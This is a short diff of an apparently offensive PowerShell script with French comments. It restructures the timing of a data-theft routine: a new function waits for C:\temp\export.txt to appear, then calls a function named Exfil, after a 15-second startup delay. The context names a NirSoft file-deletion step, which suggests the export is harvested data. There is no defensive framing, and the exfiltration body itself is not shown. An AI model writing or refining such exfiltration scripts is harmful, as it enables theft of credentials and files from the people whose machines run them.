@@ -122,11 +122,18 @@ function Del-Nirsoft-File {
   exit
 }
 
-
+function Wait4Setup{
 # Attendre la création de C:\temp\export.txt
 do {
-    Start-Sleep -Seconds 1
+    Start-Sleep -Seconds 2
 } until (Test-Path "C:\temp\export.txt")
 
 # Appeler la fonction Exfil
 Exfil
+}
+
+# Délai de 15 secondes (ajustez selon vos besoins)
+Start-Sleep -Seconds 15
+
+# Appeler la fonction AttendreEtExfil
+Wait4Setup
